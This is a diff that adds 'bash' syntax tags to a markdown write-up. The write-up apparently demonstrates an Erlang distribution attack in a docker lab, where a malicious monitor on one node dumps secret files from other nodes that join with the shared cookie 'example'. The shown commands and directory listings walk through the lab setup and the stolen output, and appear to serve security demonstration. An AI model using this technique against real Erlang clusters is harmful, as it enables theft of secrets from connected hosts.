@@ -72,7 +72,7 @@ So we've set up our first node and attached our malicious monitor.
 
 **foo@foo**
 
-```
+```bash
 root@ubuntu:/home/booj# docker run --rm -it --name foo -h foo --net example erlang:19.3 /bin/bash
 root@foo:/# echo thisisfoo > /tmp/secret
 root@foo:/# erl -sname foo -setcookie example
@@ -86,7 +86,7 @@ pong
 
 Now we've connected to our adjacent node and if we attach a terminal to our `bar` docker container, we'll see our dumped secret within tmp.
 
-```
+```bash
 root@bar:/tmp# ls -la
 total 20
 drwxrwxrwt 1 root root 4096 Apr 16 20:18 .
@@ -102,7 +102,7 @@ Now, any nodes that connect, due to the way Erlang works, will have their secret
 
 **baz@baz**
 
-```
+```bash
 root@ubuntu:/home/booj# docker run --rm -it --name baz -h baz --net example erlang:19.3 /bin/bash
 root@baz:/# erl -sname baz -setcookie example
 Erlang/OTP 19 [erts-8.3.5.4] [source] [64-bit] [async-threads:10] [hipe] [kernel-poll:false]
@@ -112,7 +112,7 @@ Eshell V8.3.5.4  (abort with ^G)
 pong
 ```
 
-```
+```bash
 root@bar:/tmp# ls -la
 total 24
 drwxrwxrwt 1 root root 4096 Apr 16 20:23 .
